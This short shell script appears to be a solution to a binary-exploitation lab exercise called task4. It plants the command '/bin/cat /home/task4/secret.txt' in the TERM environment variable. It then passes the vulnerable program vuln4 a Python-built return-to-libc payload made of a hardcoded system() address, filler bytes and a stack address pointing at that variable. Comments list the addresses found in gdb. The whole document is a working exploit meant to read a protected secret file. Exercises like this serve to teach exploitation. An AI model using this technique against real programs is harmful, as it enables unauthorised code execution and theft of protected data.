#!/bin/sh
export SHELL='/bin/sh'
export TERM='/bin/cat /home/task4/secret.txt'
#gdb /home/task4/vuln4
/home/task4/vuln4 $(python -c 'print "\xa0\x2d\xe4\xb7"+"RETR"+"\x7e\xf9\xff\xbf"') 1040 | head -1 | tr -d '\n'
# System \xa0\x2d\xe4\xb7
# sh     \xc3\xf9\xff\xbf
# term 	 \x9d\xf9\xff\xbf

# r $(python -c 'print "\xa0\x2d\xe4\xb7"+"RETR"+"\x46\xff\xff\xbf"') 1040
